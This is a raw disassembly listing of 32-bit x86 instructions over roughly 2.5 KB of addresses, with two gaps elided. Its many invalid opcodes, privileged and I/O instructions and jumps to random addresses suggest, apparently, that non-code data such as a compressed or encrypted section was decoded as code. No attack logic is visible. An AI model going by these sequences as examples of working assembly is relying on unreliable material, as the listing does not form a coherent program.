  422132:	jmp    0xb3f8:0xd408d4e6
  422139:	xor    eax,0x663afdb1
  42213e:	and    eax,0xfecd3a45
  422143:	jg     0x4220d4
  422145:	icebp  
  422146:	jecxz  0x4220d1
  422148:	rol    DWORD PTR [edi],0xa7
  42214b:	fnstsw WORD PTR ss:[edi-0x6e]
  42214f:	push   ebx
  422150:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422151:	push   0x0
	...
  422322:	ret    0x4248
  422325:	add    dh,al
  422327:	dec    eax
  422328:	inc    edx
  422329:	add    dl,cl
  42232b:	dec    eax
  42232c:	inc    edx
  42232d:	add    dh,cl
  42232f:	dec    eax
  422330:	inc    edx
  422331:	add    dl,dl
  422333:	dec    eax
  422334:	inc    edx
  422335:	add    dh,dl
  422337:	dec    eax
  422338:	inc    edx
  422339:	add    dl,bl
  42233b:	dec    eax
  42233c:	inc    edx
  42233d:	add    dh,bl
  42233f:	dec    eax
  422340:	inc    edx
  422341:	add    BYTE PTR [ebp-0x29],dl
  422344:	mov    edx,0x7defba87
  422349:	xlat   BYTE PTR ds:[ebx]
  42234a:	lea    esp,[esi+edx*4+0x6a]
  42234e:	std    
  42234f:	ret    0xee1c
  422352:	cwde   
  422353:	or     al,0x1
  422355:	add    BYTE PTR ds:0x82000007,ah
  42235b:	pop    edx
  42235c:	inc    ecx
  42235d:	and    edx,DWORD PTR [ebx-0x5a]
  422360:	or     al,0xc6
  422362:	adc    BYTE PTR [esi+0xbd6034a],0xeb
  422369:	(bad)
  42236d:	mov    ds:0xf14fa6d7,al
  422372:	(bad)  
  422374:	push   ds
  422375:	jnp    0x42239f
  422377:	push   edx
  422378:	sbb    BYTE PTR [eax+0x3f4ec248],dh
  42237e:	cmp    ah,dl
  422380:	lahf   
  422381:	push   edi
  422382:	stos   DWORD PTR es:[edi],eax
  422383:	sub    eax,0x2e57da9d
  422388:	daa    
  422389:	pushf  
  42238a:	pop    ds
  42238b:	lods   al,BYTE PTR ds:[esi]
  42238c:	jecxz  0x422326
  42238e:	sbb    ch,BYTE PTR [edi-0x19]
  422391:	out    dx,al
  422392:	std    
  422393:	repz jmp 0xb4e2a08
  422399:	sbb    ah,BYTE PTR [ebx-0x27266578]
  42239f:	jb     0x42232e
  4223a1:	sti    
  4223a2:	cmp    ebx,DWORD PTR [ebx+0x4bdcc0c7]
  4223a8:	fadd   QWORD PTR [edx+0x5da71857]
  4223ae:	mov    cl,0xa
  4223b0:	or     edx,edx
  4223b2:	mov    eax,ds:0xb4b79b35
  4223b7:	xchg   edi,eax
  4223b8:	cmp    BYTE PTR ds:0xac69930e,bl
  4223be:	add    ecx,DWORD PTR [esi-0x39978179]
  4223c4:	(bad)
  4223c7:	clc    
  4223c8:	add    eax,0x39ca6c71
  4223cd:	inc    edi
  4223ce:	call   0x2388887a
  4223d3:	add    bh,BYTE PTR [esi]
  4223d5:	or     DWORD PTR [edi+0x5],0x16
  4223d9:	ds pop eax
  4223db:	cmp    BYTE PTR [ecx],0x34
  4223de:	sub    DWORD PTR [ecx+esi*2+0x39],0x38d0f68a
  4223e6:	and    edx,edx
  4223e8:	xchg   esi,edi
  4223ea:	nop
  4223eb:	ficomp WORD PTR ds:0xbb3ac8af
  4223f1:	in     eax,0x11
  4223f3:	aaa    
  4223f4:	pusha  
  4223f5:	test   eax,0x30290490
  4223fa:	(bad)  [edx+0x4777faf4]
  422400:	jo     0x42246c
  422402:	adc    esi,DWORD PTR [ebx]
  422404:	jb     0x42240e
  422406:	jno    0x422456
  422408:	jns    0x42246d
  42240a:	cmp    DWORD PTR [edi],0x2db0a773
  422410:	cld    
  422411:	mov    DWORD PTR [eax-0x69c5df5f],ecx
  422417:	lods   al,BYTE PTR ds:[esi]
  422418:	mov    al,ds:0x3ffa5a4c
  42241d:	aas    
  42241e:	cli    
  42241f:	es je  0x4223af
  422422:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422423:	cmp    al,0xe1
  422425:	cdq    
  422426:	rcl    DWORD PTR [ebx+ecx*1],cl
  422429:	mov    ?,WORD PTR [esi-0x6c]
  42242c:	std    
  42242d:	and    DWORD PTR [eax],esp
  42242f:	jns    0x42247b
  422431:	mov    esi,0xf5ed3304
  422436:	and    BYTE PTR [esi+ecx*4+0x2d7c8739],0xb7
  42243e:	xor    eax,0xabd52dd5
  422443:	lods   al,BYTE PTR ds:[esi]
  422444:	std    
  422445:	adc    ch,bl
  422447:	mov    bl,BYTE PTR [edi-0x37]
  42244a:	xor    ecx,ebp
  42244c:	sub    DWORD PTR [edx-0x1f],edi
  42244f:	repnz push esp
  422451:	adc    eax,0x33663907
  422456:	test   BYTE PTR [ecx-0x3f],ch
  422459:	mov    ecx,0x6faa779b
  42245e:	cmc    
  42245f:	xchg   ebp,eax
  422460:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422461:	lods   eax,DWORD PTR ds:[esi]
  422462:	lods   eax,DWORD PTR ds:[esi]
  422463:	in     eax,0x87
  422465:	mov    ch,0x53
  422467:	add    DWORD PTR [ebp+0x61b81e33],0x3b
  42246e:	cdq    
  42246f:	adc    ecx,DWORD PTR [ebp-0x4959285d]
  422475:	cli    
  422476:	pop    esp
  422477:	lods   al,BYTE PTR ds:[esi]
  422478:	enter  0x2376,0xb5
  42247c:	dec    ebx
  42247d:	arpl   WORD PTR [edx],bp
  42247f:	push   cs
  422480:	pushf  
  422481:	hlt    
  422482:	adc    DWORD PTR [ebx],esp
  422484:	mov    ds:0xd4a327d9,eax
  422489:	loopne 0x42248f
  42248b:	outs   dx,DWORD PTR ds:[esi]
  42248c:	lock xor eax,0x410b1b77
  422492:	adc    BYTE PTR [ecx-0x4d],ah
  422495:	mov    dl,0xe8
  422497:	pop    ss
  422498:	shr    BYTE PTR [esi-0x4f],0x5e
  42249c:	in     eax,0xfe
  42249e:	shr    BYTE PTR [ebx],cl
  4224a0:	add    al,0xc5
  4224a2:	cwde   
  4224a3:	shl    al,0xcc
  4224a6:	fs jmp 0xbcd23aed
  4224ac:	shl    BYTE PTR [edx],1
  4224ae:	mov    eax,0x78d88e3d
  4224b3:	into   
  4224b4:	mov    dl,0xb
  4224b6:	ins    DWORD PTR es:[edi],dx
  4224b7:	setno  BYTE PTR [ebx-0x62]
  4224bb:	loopne 0x422508
  4224bd:	arpl   bx,ax
  4224bf:	aaa    
  4224c0:	sub    edx,0x40
  4224c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4224c4:	mov    cl,0xa6
  4224c6:	inc    esp
  4224c7:	push   ebp
  4224c8:	push   ecx
  4224c9:	xchg   BYTE PTR [ebx],ch
  4224cb:	icebp  
  4224cc:	mov    ah,0x37
  4224ce:	cmp    eax,0x63a117d3
  4224d3:	jmp    0x3660e992
  4224d8:	push   ebx
  4224d9:	mov    ds:0xd4f3daa1,al
  4224de:	pop    ebp
  4224df:	inc    ebx
  4224e0:	dec    esp
  4224e1:	jno    0x42252b
  4224e3:	aas    
  4224e4:	lods   eax,DWORD PTR ds:[esi]
  4224e5:	jns    0x42248c
  4224e7:	dec    eax
  4224e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4224e9:	push   ebp
  4224ea:	xchg   edx,eax
  4224eb:	dec    ebp
  4224ec:	sub    al,0x45
  4224ee:	jg     0x42253c
  4224f0:	retf   0x5f81
  4224f3:	add    cl,BYTE PTR [ebp+0x73bba3c1]
  4224f9:	inc    edi
  4224fa:	xchg   edx,eax
  4224fb:	mov    cl,0x95
  4224fd:	push   ebp
  4224fe:	fldz   
  422500:	add    DWORD PTR [edi+0x4a201675],ebp
  422506:	inc    ebx
  422507:	inc    ebp
  422508:	je     0x422571
  42250a:	sbb    BYTE PTR [edx],cl
  42250c:	cli    
  42250d:	pop    ss
  42250e:	popa   
  42250f:	mov    ch,0xbb
  422511:	inc    esp
  422512:	icebp  
  422513:	jbe    0x422515
  422515:	int    0x73
  422517:	push   ebx
  422518:	push   ebx
  422519:	sbb    eax,0x3236e393
  42251e:	add    eax,0xe564b852
  422523:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422524:	in     al,0xc3
  422526:	cmp    DWORD PTR [ecx-0x55],ebp
  422529:	jbe    0x4224b4
  42252b:	mov    al,ds:0x9c2fd9d3
  422530:	in     eax,0x11
  422532:	jmp    0x42252a
  422534:	inc    ecx
  422535:	fsub   DWORD PTR [ecx-0x7e78bde0]
  42253b:	dec    ebp
  42253c:	sbb    dl,bl
  42253e:	push   edi
  42253f:	enter  0xd522,0x1b
  422543:	sub    DWORD PTR [eax-0x7d],ebp
  422546:	pop    edx
  422547:	aad    0x2b
  422549:	jmp    0xbcaa:0x5e643731
  422550:	nop
  422551:	test   BYTE PTR [edi],al
  422553:	xor    al,0x40
  422555:	xlat   BYTE PTR ds:[ebx]
  422556:	or     al,0x52
  422558:	pop    esi
  422559:	int    0x50
  42255b:	pusha  
  42255c:	push   esp
  42255d:	lock call 0x8ff8174f
  422563:	ficomp WORD PTR [ecx]
  422565:	sbb    BYTE PTR ds:0x4cc7c096,ah
  42256b:	or     eax,0x16a173d4
  422570:	mov    cl,0x85
  422572:	xor    cl,BYTE PTR [ecx]
  422574:	cli    
  422575:	dec    eax
  422576:	jecxz  0x4225a0
  422578:	fdiv   QWORD PTR ds:0x849d2cb3
  42257e:	stc    
  42257f:	mov    ebp,0x6a58530e
  422584:	pop    esi
  422585:	cmp    al,0x33
  422587:	inc    ebp
  422588:	mov    cl,0x7
  42258a:	pop    es
  42258b:	push   edi
  42258c:	or     eax,0x450df41d
  422591:	fcomp  QWORD PTR es:[ecx*8+0x4d9e025]
  422599:	pop    edx
  42259a:	adc    eax,0x3f3044bd
  42259f:	aam    0x2e
  4225a1:	and    edx,DWORD PTR [eax+0x50199a25]
  4225a7:	fwait
  4225a8:	mov    dl,0xfe
  4225aa:	fnsave [edi]
  4225ac:	add    BYTE PTR [esi-0xd07705a],cl
  4225b2:	jecxz  0x42257c
  4225b4:	ss and eax,0xa8c6d7b
  4225ba:	lds    edx,FWORD PTR [edi+0x3d]
  4225bd:	bound  esp,QWORD PTR [ebx]
  4225bf:	addr16 loopne 0x4225b5
  4225c2:	shl    DWORD PTR ds:0xddbadd67,1
  4225c8:	fistp  DWORD PTR ds:0xd9e2d072
  4225ce:	mov    esi,0xf59edec7
  4225d3:	ins    BYTE PTR es:[edi],dx
  4225d4:	les    ecx,FWORD PTR [ebx]
  4225d6:	leave  
  4225d7:	iret   
  4225d8:	aaa    
  4225d9:	in     eax,0xa1
  4225db:	fmul   st,st(7)
  4225dd:	dec    edx
  4225de:	pop    ebp
  4225df:	mov    ds:0x2fa64d42,al
  4225e4:	out    0x30,eax
  4225e6:	outs   dx,DWORD PTR ds:[esi]
  4225e7:	in     eax,dx
  4225e8:	xchg   ecx,eax
  4225e9:	arpl   sp,si
  4225eb:	fcmovnu st,st(0)
  4225ed:	test   ecx,esp
  4225ef:	pop    ss
  4225f0:	sub    DWORD PTR ds:0x6062609c,edx
  4225f6:	(bad)  [edx-0x4795ff79]
  4225fc:	cmp    edx,edi
  4225fe:	in     eax,0x55
  422600:	fisubr WORD PTR ds:0x575386b9
  422606:	std    
  422607:	add    DWORD PTR [eax+0x48],0xb717ec28
  42260e:	test   al,0xc2
  422610:	arpl   WORD PTR [ebp+0x251707f1],cx
  422616:	push   eax
  422617:	xor    BYTE PTR [ecx-0xe],ah
  42261a:	mov    ch,0x89
  42261c:	and    BYTE PTR [esi],bh
  42261e:	scas   eax,DWORD PTR es:[edi]
  42261f:	ins    DWORD PTR es:[edi],dx
  422620:	sub    dh,BYTE PTR [esi+0x18]
  422623:	sar    dh,0x7a
  422626:	or     BYTE PTR [eax+0x4be15c54],ah
  42262c:	push   es
  42262d:	repz jae 0x4225dd
  422630:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422631:	es jecxz 0x4226a6
  422634:	mov    al,ds:0x77f3e65a
  422639:	packsswb mm2,mm3
  42263c:	xchg   edx,eax
  42263d:	mov    dl,BYTE PTR [eax]
  42263f:	jp     0x422677
  422641:	lods   al,BYTE PTR ds:[esi]
  422642:	add    edi,ebx
  422644:	sub    ebx,ebp
  422646:	addr16 push ss
  422648:	and    cl,dl
  42264a:	mov    WORD PTR [ecx-0x5e205a80],?
  422650:	or     al,0x15
  422652:	outs   dx,BYTE PTR ds:[esi]
  422653:	mov    bl,0x96
  422655:	xor    cl,BYTE PTR [edi]
  422657:	jbe    0x422679
  422659:	test   al,0xc4
  42265b:	into   
  42265c:	sti    
  42265d:	adc    eax,eax
  42265f:	pop    esi
  422660:	add    al,0x69
  422662:	arpl   WORD PTR [esi+0x63e96ea8],bx
  422668:	or     ebx,DWORD PTR [edx-0x3941f485]
  42266e:	add    DWORD PTR [eax],0xffffffc3
  422671:	out    dx,al
  422672:	sub    al,0xdb
  422674:	gs mov dh,0xa2
  422677:	ror    BYTE PTR [esi+0x33deba8e],0x93
  42267e:	ins    DWORD PTR es:[edi],dx
  42267f:	xchg   ebp,eax
  422680:	sub    BYTE PTR [ecx+0x22],al
  422683:	mov    DWORD PTR [ecx-0x550b00f7],ecx
  422689:	or     ebp,DWORD PTR [esi+0x12]
  42268c:	add    ch,dh
  42268e:	dec    esi
  42268f:	push   edi
  422690:	mov    ?,WORD PTR [ebp-0x4668c4a3]
  422696:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422697:	adc    al,0x48
  422699:	push   0xffffffa7
  42269b:	cmc    
  42269c:	gs mov dl,0xf8
  42269f:	addr16 dec edi
  4226a1:	adc    ah,BYTE PTR [ebp+ebp*2-0x4c49c0d3]
  4226a8:	out    0x21,al
  4226aa:	dec    esp
  4226ab:	jns    0x422693
  4226ad:	sub    al,0x3c
  4226af:	mov    ebx,0xd8ac9c91
  4226b4:	retf   0xb512
  4226b7:	gs ret 
  4226b9:	jnp    0x42271b
  4226bb:	jl     0x42268e
  4226bd:	sahf   
  4226be:	adc    BYTE PTR [ecx],dl
  4226c0:	inc    ebx
  4226c1:	jo     0x422727
  4226c3:	sbb    BYTE PTR [ebx+eax*1],dh
  4226c6:	push   edi
  4226c7:	bound  ebx,QWORD PTR [ebp+0x1b]
  4226ca:	addr16 pop edx
  4226cc:	lock (bad) 
  4226ce:	nop
  4226cf:	jl     0x422705
  4226d1:	inc    ebp
  4226d2:	and    esp,DWORD PTR [edx]
  4226d4:	dec    edx
  4226d5:	daa    
  4226d6:	imul   ebx,DWORD PTR [edx],0xc
  4226d9:	arpl   WORD PTR [esi],si
  4226db:	push   ebp
  4226dc:	sbb    dl,BYTE PTR [eax]
  4226de:	jno    0x4226b7
  4226e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226e1:	inc    ebp
  4226e2:	rol    DWORD PTR [esp+esi*8],0xea
  4226e6:	jle    0x422740
  4226e8:	mov    ecx,0xeada1f05
  4226ed:	xchg   edi,ebp
  4226ef:	sbb    BYTE PTR [ebx+0x23],0x7
  4226f3:	ds pop eax
  4226f5:	dec    eax
  4226f6:	stos   BYTE PTR es:[edi],al
  4226f7:	ins    DWORD PTR es:[edi],dx
  4226f8:	mov    bl,0x4c
  4226fa:	mov    esi,0x475546d
  4226ff:	test   al,0xd8
  422701:	call   0x9195a93b
  422706:	xor    al,0x5a
  422708:	cmp    al,BYTE PTR [ebx+edi*2-0x2681f983]
  42270f:	inc    edi
  422710:	loop   0x42274e
  422712:	int    0x69
  422714:	pop    ecx
  422715:	mov    ch,0x86
  422717:	loop   0x422790
  422719:	mov    esi,0x15089e57
  42271e:	daa    
  42271f:	nop
  422720:	mov    dl,0x1d
  422722:	inc    esp
  422723:	out    dx,eax
  422724:	jns    0x4226bd
  422726:	mov    dh,0x71
  422728:	adc    BYTE PTR [ecx+edx*8+0x56a9868f],bh
  42272f:	sbb    cl,BYTE PTR [eax-0x69]
  422732:	je     0x422764
  422734:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422735:	imul   edi,DWORD PTR [ecx],0xd03044d1
  42273b:	mov    dh,0x49
  42273d:	test   DWORD PTR [edx+0x56],esi
  422740:	cmc    
  422741:	and    eax,0x6f7e28c3
  422746:	push   es
  422747:	or     dl,BYTE PTR [ecx-0xfe24571]
  42274d:	aas    
  42274e:	adc    esi,eax
  422750:	lods   al,BYTE PTR ds:[esi]
  422751:	fcomip st,st(0)
  422753:	mov    edi,0x681270f5
  422758:	cmp    ch,BYTE PTR [ebp-0x14]
  42275b:	pop    ecx
  42275c:	aad    0xf3
  42275e:	adc    eax,0x6195e2ec
  422763:	cwde   
  422764:	mov    cl,0x4e
  422766:	xchg   BYTE PTR [eax+0x16],cl
  422769:	xchg   edx,eax
  42276a:	cmp    BYTE PTR [ebp+0x57],al
  42276d:	jp     0x4226f0
  42276f:	xchg   ebp,eax
  422770:	cmp    eax,0x8022b686
  422775:	cmp    eax,0xf9d7e47a
  42277a:	dec    ebx
  42277b:	test   BYTE PTR [edi+0x69],dh
  42277e:	xchg   esp,eax
  42277f:	outs   dx,BYTE PTR ds:[esi]
  422780:	mov    dh,0xde
  422782:	mov    ch,0xfa
  422784:	shl    DWORD PTR [ecx-0x7cc3c947],1
  42278a:	sub    bh,BYTE PTR [ebx]
  42278c:	jl     0x422761
  42278e:	clc    
  42278f:	or     DWORD PTR [edi-0x62],edi
  422792:	aam    0x8d
  422794:	mov    dh,dh
  422796:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422797:	push   edx
  422798:	jnp    0x42273f
  42279a:	loopne 0x422790
  42279c:	(bad)  
  42279d:	xor    dl,BYTE PTR [ebx]
  42279f:	ins    BYTE PTR es:[edi],dx
  4227a0:	test   DWORD PTR [ebx-0x2674debf],ebx
  4227a6:	fdiv   QWORD PTR ds:0xa028af5b
  4227ac:	std    
  4227ad:	fdiv   st(5),st
  4227af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227b0:	lods   al,BYTE PTR ds:[esi]
  4227b1:	std    
  4227b2:	or     ebp,eax
  4227b4:	mov    esp,0xd3115abf
  4227b9:	mov    ch,0xf5
  4227bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227bc:	sbb    cl,BYTE PTR [edi]
  4227be:	adc    BYTE PTR ds:0xfd832b15,bh
  4227c4:	sti    
  4227c5:	and    eax,0xece48467
  4227ca:	hlt    
  4227cb:	sub    esp,DWORD PTR [ecx+edx*1+0x2ff6ed73]
  4227d2:	adc    eax,0xaeebb3e7
  4227d7:	popf   
  4227d8:	xor    BYTE PTR [ecx],cl
  4227da:	sbb    BYTE PTR [esp+ecx*8+0x46],bh
  4227de:	mov    WORD PTR [edi-0x18],?
  4227e1:	jg     0x4227f0
  4227e3:	mov    ch,0xc4
  4227e5:	add    bl,BYTE PTR [edi]
  4227e7:	out    dx,eax
  4227e8:	sub    eax,0xaad65a8e
  4227ed:	push   edx
  4227ee:	cld    
  4227ef:	cmp    DWORD PTR [edi],edi
  4227f1:	mov    esi,ecx
  4227f3:	or     esp,esi
  4227f5:	mov    ebp,DWORD PTR [ebx]
  4227f7:	fxch   st(0)
  4227fa:	retf   
  4227fb:	lock pop ss
  4227fd:	ins    DWORD PTR es:[edi],dx
  4227fe:	mov    dh,0x5c
  422800:	mov    ds:0xda3e7110,al
  422805:	inc    eax
  422806:	push   ecx
  422807:	and    DWORD PTR [edi-0x6c106f89],esi
  42280d:	repnz icebp 
  42280f:	(bad)  
  422811:	inc    ebp
  422812:	test   BYTE PTR [ebx+0xd],al
  422815:	lods   al,BYTE PTR ds:[esi]
  422816:	ss pushf 
  422818:	int    0x17
  42281a:	cdq    
  42281b:	jo     0x42284e
  42281d:	(bad)  
  42281f:	arpl   WORD PTR [ecx],si
  422821:	fldenv [ecx-0x66d79e0c]
  422827:	nop
  422828:	and    BYTE PTR [edi-0x29],ch
  42282b:	ret    
  42282c:	push   esi
  42282d:	xchg   ecx,eax
  42282e:	sete   ch
  422831:	ds dec esi
  422833:	pop    ecx
  422834:	rcr    BYTE PTR [ebx+0x10],0x98
  422838:	inc    ebx
  422839:	jae    0x4227bc
  42283b:	xor    eax,0x6c8660c
  422840:	fcom   QWORD PTR [edi]
  422842:	ret    
  422843:	fdivr  QWORD PTR [edi]
  422845:	addr16 xor ebp,0x1c7da25e
  42284c:	lods   al,BYTE PTR ds:[esi]
  42284d:	daa    
  42284e:	nop
  42284f:	call   0xcdf597ab
  422854:	es dec ebx
  422856:	pop    ss
  422857:	pop    ecx
  422858:	ds ins BYTE PTR es:[edi],dx
  42285a:	push   ebp
  42285b:	push   es
  42285c:	sub    BYTE PTR [edi+eax*4+0x7b],cl
  422860:	mov    eax,0x76c5a8a4
  422865:	pop    ebx
  422866:	adc    ah,BYTE PTR [ebx+ecx*1-0x6050bf4a]
  42286d:	push   edi
  42286e:	dec    esi
  42286f:	hlt    
  422870:	sub    BYTE PTR [eax],ah
  422872:	jne    0x42280b
  422874:	adc    ch,ch
  422876:	dec    edi
  422877:	dec    eax
  422878:	(bad)  
  422879:	aam    0x98
  42287b:	sub    al,0x24
  42287d:	add    DWORD PTR [ebp+0x4d55636d],edx
  422883:	xchg   edi,eax
  422884:	jo     0x4228fc
  422886:	pusha  
  422887:	jne    0x4228e3
  422889:	jl     0x42280b
  42288b:	scas   al,BYTE PTR es:[edi]
  42288c:	jecxz  0x4228c0
  42288e:	push   0x1f443a87
  422893:	push   eax
  422894:	aas    
  422895:	cmp    al,0xc9
  422897:	stc    
  422898:	or     ebp,DWORD PTR [ebx+0x1]
  42289b:	fwait
  42289c:	pop    eax
  42289d:	push   esp
  42289e:	jecxz  0x42291f
  4228a0:	retf   0xfcc1
  4228a3:	out    0x45,eax
  4228a5:	and    DWORD PTR [ecx-0x1791867],ecx
  4228ab:	sbb    eax,0xf8740d38
  4228b0:	xor    cl,BYTE PTR [esi+edx*2]
  4228b3:	cmp    eax,0x84382247
  4228b8:	cmp    ebp,esp
  4228ba:	fs cmc 
  4228bc:	aaa    
  4228bd:	xor    eax,0x428a31e2
  4228c2:	sub    eax,0x1a05f737
  4228c7:	jle    0x42289a
  4228c9:	jmp    0x8c79a992
  4228ce:	cld    
  4228cf:	cmovle ecx,DWORD PTR [esi]
  4228d2:	or     eax,0x64d6b0b9
  4228d7:	sub    DWORD PTR [ecx-0x8],0xa32b9343
  4228de:	les    ebx,FWORD PTR [ebp-0x19f1e1ff]
  4228e4:	das    
  4228e5:	jae    0x42292e
  4228e7:	lock inc edx
  4228e9:	fcom   QWORD PTR [ebx-0x2c2b6526]
  4228ef:	jae    0x422931
  4228f1:	test   eax,0x5be77de7
  4228f6:	mov    esi,0xe48f90f6
  4228fb:	inc    ebx
  4228fc:	popw   ss
  4228fe:	mov    edi,0x6f0d4917
  422903:	pop    ds
  422904:	pop    ss
  422905:	nop
  422906:	shr    BYTE PTR [edi],cl
  422908:	inc    eax
  422909:	mov    al,ds:0xfcc9a5af
  42290e:	das    
  42290f:	mov    ds:0x832de7f5,al
  422914:	call   0xb5bf8b26
  422919:	icebp  
  42291a:	jecxz  0x4228d0
  42291c:	pusha  
  42291d:	and    ebp,0x21111d3
  422923:	das    
  422924:	sahf   
  422925:	or     eax,0xfed17d3f
  42292a:	dec    eax
  42292b:	into   
  42292c:	push   edi
  42292d:	je     0x42290b
  42292f:	test   dl,al
  422931:	rcl    eax,1
  422933:	mov    bh,0x2f
  422935:	cmp    BYTE PTR [edi-0x3d15edd9],0x58
  42293c:	mov    ebp,0xdd0f9b76
  422941:	jne    0x422963
  422943:	repz (bad)
  422946:	nop
  422947:	and    DWORD PTR [edi],ebx
  422949:	shl    BYTE PTR ds:0xa500cee,cl
  42294f:	pop    esp
  422950:	mov    ds:0x4f9f2e52,al
  422955:	push   esp
  422956:	stos   BYTE PTR es:[edi],al
  422957:	add    BYTE PTR [esp+ecx*1+0x60],0x78
  42295c:	loope  0x422988
  42295e:	hlt    
  42295f:	xchg   DWORD PTR [ebx+eax*1],edi
  422962:	pop    edi
  422963:	cmp    edx,ecx
  422965:	cmp    BYTE PTR [edx+0x1025d064],ch
  42296b:	cmp    eax,DWORD PTR [ecx+esi*4]
  42296e:	lock fcomp DWORD PTR [edi-0x712ffa32]
  422975:	add    BYTE PTR [ebx+0x29],cl
  422978:	fbld   TBYTE PTR [ebp-0x70beb14d]
  42297e:	adc    dh,dh
  422980:	aaa    
  422981:	inc    ecx
  422982:	sub    BYTE PTR [eax+0x758736a9],0x34
  422989:	mov    al,ds:0xecf43d44
  42298e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42298f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422990:	gs dec eax
  422992:	pop    esi
  422993:	dec    BYTE PTR [ecx-0x625beba4]
  422999:	xor    esi,0x37699f65
  42299f:	mov    edx,0x30565c33
  4229a4:	xchg   ebx,eax
  4229a5:	add    DWORD PTR [edi+0x22d0a86e],esp
  4229ab:	or     eax,0x949ed9bb
  4229b0:	push   eax
  4229b1:	adc    BYTE PTR [ebx-0x4701e066],al
  4229b7:	push   ds
  4229b8:	out    0x6e,al
  4229ba:	loope  0x422a02
  4229bc:	add    eax,0xb37f3039
  4229c1:	pop    ebp
  4229c2:	push   eax
  4229c3:	add    dh,dl
  4229c5:	jp     0x422952
  4229c7:	mov    ds:0x1454bb1d,al
  4229cc:	rcl    DWORD PTR [esi-0x1c],0xba
  4229d0:	mov    sp,WORD PTR [edi+0xa]
  4229d4:	xchg   al,al
  4229d6:	fadd   DWORD PTR ds:0x2ce2405
  4229dc:	and    dl,BYTE PTR ds:0x4a403b9
  4229e2:	popf   
  4229e3:	xor    BYTE PTR [edi+eax*8+0x239340c],bl
  4229ea:	test   eax,0xdd140295
  4229ef:	adc    DWORD PTR [edx+0x2d],esi
  4229f2:	push   ebp
  4229f3:	cs inc eax
  4229f5:	mov    ?,WORD PTR [ecx+0x3ad86adf]
  4229fb:	shl    DWORD PTR [ebx],0x42
  4229fe:	push   ebx
  4229ff:	out    0x93,al
  422a01:	(bad)  
  422a02:	xor    al,BYTE PTR [edx]
  422a04:	inc    esp
  422a05:	add    DWORD PTR [eax+0x1875fadf],ebp
  422a0b:	mov    DWORD PTR [eax+0x76933f31],ebx
  422a11:	jbe    0x422a58
  422a13:	int3   
  422a14:	std    
  422a15:	add    ecx,DWORD PTR [edx+0x14]
  422a18:	test   eax,0x52ea7493
  422a1d:	and    DWORD PTR ds:0x554c7cc3,0x1f
  422a24:	int    0xde
  422a26:	sub    bl,ah
  422a28:	inc    ecx
  422a29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a2a:	loop   0x422a02
  422a2c:	scas   al,BYTE PTR es:[edi]
  422a2d:	inc    eax
  422a2e:	xlat   BYTE PTR ds:[ebx]
  422a2f:	bnd jno 0x422a43
  422a32:	iret   
  422a33:	add    DWORD PTR ds:0xaad8b9c1,0x57
  422a3a:	push   edx
  422a3b:	aam    0xaa
  422a3d:	ret    0x54b1
  422a40:	lods   eax,DWORD PTR ds:[esi]
  422a41:	imul   edx,DWORD PTR [ebx+0x54],0x9a16e98e
  422a48:	mov    bl,0x4c
  422a4a:	pop    ds
  422a4b:	js     0x422a58
  422a4d:	popa   
  422a4e:	popa   
  422a4f:	or     BYTE PTR [ecx+0x56e53ffe],al
  422a55:	gs cs pusha 
  422a58:	xlat   BYTE PTR ds:[ebx]
  422a59:	pop    esp
  422a5a:	(bad)  
  422a5b:	shl    DWORD PTR [ebp-0x42c46998],1
  422a61:	inc    esp
  422a62:	lds    esi,FWORD PTR [ebx]
  422a64:	xacquire xchg BYTE PTR [edx+0xd78200a],cl
  422a6b:	mov    ds:0xd72e7f31,al
  422a70:	pop    ds
  422a71:	in     eax,dx
  422a72:	fist   WORD PTR [esi+0x29]
  422a75:	cld    
  422a76:	cmp    bl,BYTE PTR [ecx+0x6b08ba78]
  422a7c:	ret    0x597
	...
  422abf:	add    BYTE PTR [eax],al
  422ac1:	add    BYTE PTR ds:0xfe3de0ab,dl
  422ac7:	jg     0x422aa6
  422ac9:	stos   DWORD PTR es:[edi],eax
  422aca:	mov    esi,DWORD PTR [edi+0x3117d01b]
  422ad0:	stos   DWORD PTR es:[edi],eax
  422ad1:	aas    
  422ad2:	mov    ebp,0x25000113
  422ad7:	pop    es
  422ad8:	add    BYTE PTR [eax],al
  422ada:	mov    dh,BYTE PTR [ebx+0x6c789516]
  422ae0:	push   eax
  422ae1:	loope  0x422b56
  422ae3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ae4:	mov    ds:0xfb86b949,al
  422ae9:	inc    edx
  422aea:	test   al,0x25
  422aec:	inc    ebp
  422aed:	(bad)  
  422aee:	jne    0x422b6b
  422af0:	inc    ebx
  422af1:	sub    BYTE PTR [edi-0x2d7a9bcc],bh
  422af7:	test   DWORD PTR [eax-0x34ae67fe],edi
  422afd:	sahf   
  422afe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422aff:	sar    eax,0x4a
  422b02:	rol    BYTE PTR [ebp+0x50],1
  422b05:	(bad)  [eax+0x76af1f1d]
  422b0b:	into   
  422b0c:	vmwrite ecx,edi
  422b0f:	ds dec edx
  422b11:	push   edi
  422b12:	daa    
  422b13:	shr    BYTE PTR [ebx-0x6e],1
  422b16:	ret    0x20e9
  422b19:	dec    ecx
  422b1a:	jg     0x422ab5
  422b1c:	mov    WORD PTR [ecx-0x29],gs
  422b1f:	pop    es
  422b20:	scas   al,BYTE PTR es:[edi]
  422b21:	sbb    eax,0xde0b25f5
  422b26:	push   ebx
  422b27:	xlat   BYTE PTR ds:[ebx]
  422b28:	pop    ebx
  422b29:	mov    bl,0x50
  422b2b:	mov    DWORD PTR [edi],ebp
